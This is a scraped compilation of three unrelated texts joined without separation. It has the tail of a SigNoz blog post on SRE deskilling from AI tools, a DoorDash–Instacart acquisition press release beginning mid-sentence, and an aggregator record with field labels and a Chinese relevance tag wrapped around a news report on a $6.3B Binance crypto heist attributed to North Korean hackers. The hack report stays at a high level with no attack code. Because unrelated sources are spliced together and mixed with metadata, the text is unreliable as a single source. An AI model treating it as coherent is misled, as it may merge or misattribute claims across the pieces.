and not self-healing.SREs realise their skills are degrading and lean more on AI to compensate, which further degrades their skills, creating a vicious cycle from which escape is difficult.We are definitely not rejecting AI tooling; we are adopting it and integrating it stronger than ever before, because that’s the only way forward.A few approaches worth considering:Deliberate inefficiency. Just as the FAA mandates manual flying time even when the autopilot is perfectly capable, SRE teams can designate certain incidents, even the ones the AI could handle, as human-practice opportunities. This can be considered as a long-term investment to keep skills fresh, although it might come at the cost of a super-fast solutionBuild for human-in-the-loop, not human-on-the-side. There’s a meaningful difference between a system where a human approves an AI’s recommendation and one where a human actively engages with the problem alongside AI. The former keeps humans in a supervisory role that Bainbridge (the lady who wrote that research paper about 40 years ago) showed leads to vigilance decay, and the latter keeps them cognitively engaged.Let’s zoom out and take a look at the bigger picture.Everything we’ve discussed here, the ironies of automation, the deskilling risk, the never-skilling problem, collectively applies well beyond SRE. Software engineering as a whole is navigating the same tension. As AI writes more code, reviews more PRs, and handles more debugging, the same questions apply.We’re talking about SREs specifically because that’s the world we live in at SigNoz. We build an open-source observability platform, the kind of tool that gives SREs the metrics, traces, and logs they need to understand their systems deeply. For us, this deskilling question is not a rhetorical fad; it directly shapes how we’re building AI into our product.Our approach is to start with an AI assistant that helps SREs leverage the power of LLMs while keeping humans firmly in control. Eventually, we’ll enable more autonomy but within clear guardrails, and only as trust is earned.One advantage we have in this space is that, as an observability platform, we sit on the data itself, the metrics, traces, and logs that SREs rely on. Most AI SRE products today integrate with observability tools through APIs, which means they’re working with a limited, second-hand view of your systems. Because we own the data layer, we can build much deeper, more context-aware AI capabilities that understand your system the way an experienced SRE would.And to answer the burning question in your head, our goal isn’t AI that replaces SREs. It’s AI that supercharges SREs. Unlike ongoing lore, we believe humans will remain essential for the decisions that matter most, especially those that impact production infrastructure.The future of SRE is human with AI intentionally designed to keep humans sharp, engaged, and ready for the 5% that really counts.Here’s the LinkedIn post our founder posted a few days ago, which inspired me to write this.No posts

(NASDAQ: DASH) and Maplebear Inc. (d.b.a. Instacart, NASDAQ: CART) today announced a definitive agreement under which DoorDash will acquire Instacart for a total value of $65.00 for each Instacart share, or an equity value of approximately $17 billion. The aggregate transaction consideration will be at least 75% cash, with Instacart stockholders able to elect cash, DoorDash stock, or a combination of both, subject to proration so that DoorDash stock does not exceed 25% of the aggregate consideration. Instacart's board of directors has unanimously approved the agreement.DoorDash and Instacart share a mission to help local businesses succeed. Families turn to Instacart for the big weekly shop and to DoorDash for meals and nearly anything else they need from their neighborhood in under an hour. The combined company will offer grocers and retailers of every size DoorDash's delivery network and Instacart's grocery and fulfillment technology, in both apps and on stores' own websites, along with the advertising and AI tools each company has built. On either app, customers pick a store in their own community, and the store makes the sale. Consumers will have more stores to choose from, more savings opportunities when they choose to shop with a local business, and faster delivery options, while Dashers and Shoppers will have more ways to earn.Most grocery shopping still happens in stores, but more people are buying groceries and everyday goods online. They expect fast, affordable delivery and an easy way to order. The biggest online retailers and grocers are racing ahead, building their own delivery fleets, warehouses, membership programs, and AI shopping assistants. A grocer or retailer running on thin margins cannot build all of that alone, and with AI, the playing field risks being tilted even further away from local commerce.DoorDash and Instacart believe that communities benefit when Main Street competes, and they build the tools that empower local businesses. Together, they could help local stores grow online. More grocers could deploy Instacart's technology to run their own websites and retail media networks, bringing them more sales and advertising revenue. Brands would gain a scaled alternative for reaching customers online. Grocers could add capacity for online orders through DoorDash's DashMart Fulfillment Services and offer faster, more accurate, and more affordable delivery.“Grocery is one of the hardest things to get right online. Someone has to pick a ripe avocado, find a substitute you’d choose yourself, and get the ice cream to you before it melts,” said Tony Xu, co-founder and CEO of DoorDash. “Instacart has spent years learning to do that well for grocers, while DoorDash has built a delivery network and technology that local stores rely on every day. Together, we could give stores of every size more of those tools and unlock the potential of grocery delivery. It’s still early innings, but we know that when more people shop local, more dollars stay local.”“Over the last 14 years, Instacart has transformed online grocery by helping retailers of all sizes compete and grow, and joining forces with DoorDash allows us to do even more,” said Chris Rogers, CEO of Instacart. “When our purpose-built grocery technology and trusted retailer and brand relationships are combined with DoorDash’s global consumer reach and logistics capabilities, we can create new opportunities for our retail and brand partners, offer an even better experience for customers and shoppers, and deliver compelling value for our shareholders. Together, we can accelerate innovation across the grocery industry and make online grocery more seamless and affordable for the millions of households we serve.”Benefits and commitmentsDoorDash expects many benefits will flow from the transaction, including:More Choice for Consumers: Instacart customers could shop at more than 50,000 additional stores, on top of the nearly 100,000 stores on the Instacart platform today.Two Memberships for the Price of One: DashPass and Instacart+ members would pay one membership fee instead of two, which would save them an estimated $100 million per year on membership fees alone.More Ways to Earn for Dashers and Shoppers: More orders for local businesses can create more earning opportunities, with more choice over when and how they earn, whether that’s grocery orders on a quiet day, restaurant orders at peak times, or both.DoorDash is proud to share a few of the post-close commitments it is making today that demonstrate how this deal benefits local communities:Open Platform, No Grocery Exclusivity: Local grocers can work with any delivery platform they choose to help them grow.Shoppers Keep What They Love: Instacart Shoppers can keep the features they love, including the flexibility to choose how much they work and the information they need to decide which batches to accept, and choose whether to take on DoorDash orders or keep shopping only on Instacart.Following closing, DoorDash is expected to keep Instacart’s brand, enterprise technology products, and app. Until the transaction closes, DoorDash and Instacart will continue to operate as separate and independent companies.Transaction detailsThe value of $65.00 per Instacart share represents a 26% premium to Instacart's closing price on October 22, 2026, the last trading day before media reports about a possible transaction. Instacart stockholders will have the right to elect to receive, for each Instacart share: (i) $65.00 in cash, (ii) 0.3372 shares of DoorDash common stock, or (iii) a mix of $48.75 in cash and 0.0843 shares of DoorDash common stock, in each case, subject to a cap on the total stock consideration issuable by DoorDash equal to 25% of the aggregate consideration and certain proration mechanics. If stock consideration is oversubscribed, applicable Instacart stockholders will receive stock consideration on a prorated basis.DoorDash expects to fund the cash portion of the consideration with cash on hand and proceeds from debt financing. DoorDash has entered into a financing commitment letter with JPMorgan Chase Bank, N.A. providing for a 364-day senior unsecured bridge loan facility in support of the debt component of the transaction, subject to satisfaction or waiver of certain customary conditions. The transaction is not subject to a financing condition. DoorDash is targeting a capital structure that will maintain investment-grade ratings.The transaction is expected to close in the end of 2027 or the first half of 2028, subject to approval by Instacart stockholders, the expiration or termination of the waiting period under the Hart-Scott-Rodino Antitrust Improvements Act of 1976, other regulatory approvals, including in Canada and Israel, and other customary closing conditions. Stockholders holding about 19% of Instacart's outstanding shares have agreed to vote in favor of the transaction.Conference callDoorDash will separately report its third quarter 2026 results today and will discuss the transaction on its earnings call at 5:30 a.m. PT (8:30 a.m. ET). stories.title: The $6.3B Binance hack was pulled off in just 20 minutes
stories.titleZh: The $6.3B Binance hack was pulled off in just 20 minutes
stories.summaryZhShort: Cryptocurrency firms and investigators are racing to freeze and track down billions of dollars of stolen digital cash following what appears to be the largest crypto heist of all time. On Thursday, starting at around 4pm...
stories.relevanceReason: 命中 2 个 AI/科技关键词。
summaryZh: Cryptocurrency firms and investigators are racing to freeze and track down billions of dollars of stolen digital cash following what appears to be the largest crypto heist of all time. On Thursday, starting at around 4pm ET, hackers started quickly siphoning around $6.3 billion in cryptocurrencies, spread across multiple blockchains, from wallets belonging to crypto exchange Binance.Following the theft, Binance almost immediately suspended all deposits and withdrawals from its services as part of its investigation into the hack and says it is working to identify who was behind the breach. The company, along with other crypto firms, says it has so far been able to freeze around half of the stolen funds—essentially stopping hackers moving the money further or trying to cash it out. Much of the remaining crypto may not be possible to freeze, however.Three crypto tracing firms have been quick to link the attack potentially to North Korean hackers. “We think North Korea is likely responsible,” Tom Robinson, chief scientist and cofounder of Elliptic, tells WIRED. “If North Korea is behind it, this one theft would almost double everything the regime has stolen in crypto to date.”The majority of the stolen crypto was taken in a period of around 20 minutes on October 29, according to analysis by crypto tracing firm TRM Labs. Wallets belonging to Binance across at least ten blockchains—including Ethereum, Bitcoin, Tron and Solana—were drained and sent to multiple addresses controlled by a single attacker, according to TRM’s analysis. “Preparation began at least 36 hours before the theft,” TRM says in a blog post. The company says one of the attacker’s wallets received three small withdrawals during a test period, before later expanding the operations.“Early on October 29, the operator deployed a first piece of code for the attack and tested it on two wallets,” TRM says. “Later that day, it rehearsed the final version on a third wallet, then routed the test funds back to itself. Four hours after that rehearsal, the same code was installed on a Binance hot wallet.” Hot wallets are cryptocurrency wallets that are internet connected and allow crypto exchanges to handle customer withdrawals. Analysts say the funds were drained from hot wallets across the impacted blockchains.The tactics used in the hack appear to mimic previous methods used by an elite subset of North Korean hackers, known by the name TraderTraitor. Crypto tracing firms TRM Labs and Chainalysis both say they believe TraderTraitor may be behind the attack, while Robinson says Elliptic hasn’t specifically tied it to the group but sees overlaps in the activity.Neither Binance nor law enforcement officials have named any suspected links between the attack and North Korean hackers. Over recent years, North Korean hackers have repeatedly targeted cryptocurrency firms and stolen hundreds of millions in crypto heists. Multiple North Korean hacking groups can target companies in the sector, but TraderTraitor have become specialists, pulling off infrequent but high profile attacks.Within North Korea’s sprawling hacking operations—often designed to earn money for the highly sanctioned and repressive regime—TraderTraitor has stood out in recent years for its sophistication and targeting of crypto and decentralized finance companies. Last year, the FBI named TraderTraitor as being responsible for the $1.5 billion hack against crypto exchange Bybit.Binance did not answer WIRED’s questions about whether it believes North Korean hackers are behind the colossal heist, pointing towards a statement saying it will cover all losses from the hack and is working with law enforcement officials to identify who is responsible.“Our initial investigation suggested that the security incident may have involved a compromised laptop, however, our subsequent investigation has uncovered additional points of breach,” the company says in a statement. “This was a complex attack, and we are doing all we can in coordination with law enforcement to resolve it.”“These folks in particular are somewhat artists in terms of getting into these distributed finance organizations,” Rafe Pilling, a senior director of threat intelligence at security company Sophos, tells WIRED. “TraderTraitor seems to focus on these larger operations. In the past, they’ve developed their own fake applications and tried to use those to get inside organizations.”TRM and Chainalysis have initially linked the attack to TraderTraitor and say the determinations are based on their analysis of both on-chain and off-chain activity. “​​The strongest evidence emerged when Chainalysis investigators observed, in real time, funds stolen from Binance commingling with funds stolen in last month’s Bitget exploit, which had been attributed to North Korean actors,” a research blog from Chainalysis says.“Binance says the attack began with a compromised engineer’s laptop. Targeting crypto company staff is a TraderTraitor hallmark,” Elliptic’s Robinson says. “The attacker funded their wallet through Tornado Cash and rehearsed the attack in advance, as in Bybit.”While around $3 billion of cryptocurrency was initially frozen in the aftermath of the attack, it is likely those behind it could still potentially take away huge sums as not all of the stolen crypto can be frozen. Research from Chainalysis says the company is seeing money “laundering patterns we have not seen before” and that thousands of transactions being quickly processed indicates that they are using “automation to obscure the trail of funds.”Elliptic’s Robinson says that around $2.8 billion, or around 44 percent of the total amount stolen, has been frozen by crypto companies and exchanges so far, with almost all of this being stablecoins. “The remaining $3.3 billion is mostly Bitcoin, Ether, and XRP, which no one can freeze,” Robinson says. “It can only be stopped when it reaches an exchange or other service. Some will be caught over the coming months, but I don’t expect the frozen share to rise much further.”
